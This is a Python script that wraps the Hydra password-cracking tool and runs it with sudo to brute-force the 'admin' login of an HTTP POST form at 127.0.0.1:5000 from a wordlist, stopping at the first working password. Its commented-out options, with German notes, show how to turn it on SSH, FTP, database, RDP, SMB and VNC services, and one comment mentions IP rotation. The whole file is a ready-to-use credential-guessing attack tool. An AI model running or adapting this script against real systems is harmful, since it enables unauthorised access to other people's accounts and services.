import subprocess
import shutil

HYDRA = shutil.which("hydra")

if not HYDRA:
    raise RuntimeError("hydra not found. Insatall on macOS: brew install hydra")

def fire():
    try:
        result = subprocess.run([
                "sudo",
                HYDRA,
                "-l", # with -L you can use a list of usernames
                "admin", 
                #------------
                "-P", # with -p you can use a single password
                #"wordlist.txt"
                ".hydra_chunk.txt", # try wordlist.txt and start this file for no ip rotation
                #------------
                #"-s", #thats how to use a other port (if ssh is not 22)
                #"PORT Number", # PORT NUMBER
                #------------
                "-t", #THREADS lower threads are more stable
                "1",
                #------------
                "-w", #timeout in seconds
                "5",
                #------------
                "-V", #shows every try
                #"-vV", # more info
                #------------
                "-f", # stop at first login
                #------------
                "-o", # store output
                "hydra_result.txt", 
                #------------
                #"-u" # first all passwords for one user then text user
                #------------
                #"-e", #
                #"nsr", # try empty password username=password and username backwards
                #------------
                "-I", # ignore warnings and start session anyway
                #------------
                #"-R", # go on with last hydra session
                #------------
                "-s", #special port
                "5000",
                #------------
                "127.0.0.1",
                #"ssh",       # Secure Shell -> Remote Linux/Unix Verwaltung, Terminal-Zugriff, Dateiübertragung (scp/sftp), Administration | Standard-Port: 22/TCP
                # "ftp",       # File Transfer Protocol -> Datei-Upload/Download auf Servern, oft Webhosting oder alte Systeme | Standard-Port: 21/TCP
                # "mysql",     # MySQL Datenbank -> Webseiten-/App-Datenbank, Benutzer, Inhalte, APIs, Backends | Standard-Port: 3306/TCP
                # "postgres",  # PostgreSQL Datenbank -> Erweiterte relationale Datenbank für Webapps, APIs, Business-Systeme | Standard-Port: 5432/TCP
                # "redis",     # Redis In-Memory Store -> Cache, Sessions, Queues, Echtzeitdaten, oft für Webapps/Backend-Systeme | Standard-Port: 6379/TCP
                # "rdp",       # Remote Desktop Protocol -> Grafischer Fernzugriff auf Windows-Systeme/Desktop | Standard-Port: 3389/TCP
                # "smb",       # Server Message Block -> Windows-Dateifreigaben, Netzlaufwerke, Druckerfreigaben, Active Directory | Standard-Port: 445/TCP
                # "vnc",       # Virtual Network Computing -> Plattformunabhängiger grafischer Fernzugriff auf Desktop-Oberflächen | Standard-Port: 5900/TCP
                #-----------
                #"http-get", # http basic auth
                #"/admin",
                #-----------
                "http-post-form",
                "/login:username=^USER^&password=^PASS^:Invalid",
                 
                # meaning:
                # /login                         = Login-Pfad
                # username=^USER^&password=^PASS^ = POST-Daten
                # Invalid                        = Text bei falschem Login
                ],
                capture_output=True,
                text=True,
                check=True       
        )

        return result.stdout

    except subprocess.CalledProcessError as e:

        print("HYDRA failed!")
        print("Exit code:", e.returncode)
        print("STDERR:", e.stderr)

    return None

if __name__ == "__main__":

    output = fire()

    if output:
        print(output)